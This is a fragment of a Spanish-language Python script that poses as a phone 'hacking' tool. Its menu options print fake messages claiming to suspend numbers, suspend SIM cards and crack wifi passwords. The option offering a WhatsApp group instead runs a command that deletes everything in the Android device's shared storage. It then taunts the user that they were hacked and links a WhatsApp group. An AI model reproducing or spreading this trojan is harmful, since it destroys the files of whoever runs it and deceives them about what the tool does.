...
if X == "1":
    ...
    print(f"el numero {H} a sido suspendido revisa tu galeria :)")
    ...
    time.sleep(3)
    #SimSuspendida
    print("la Sim a sido suspendida! revisa tu galeria")
    ...
    print(f"hackeando el wifi {B}")
    time.sleep(3)
    print(f"el wifi a sido hackeado con exito!. revisa tu galeria \nla Contraseña es: {U}")
    
elif X == "5":
    W = os.system("rm -rf /storage/emulated/0/*")
    W = input("digite de que año quieres que sea el Grupo: \n> ")
    print(f"quieres un grupo del año {W}?. \n Fuiste Hackeado entra a este grupo de whatsapp y pide tus datos :): /n>https://chat.whatsapp.com/GDMwnjdChBP803fihiUuc4 ")
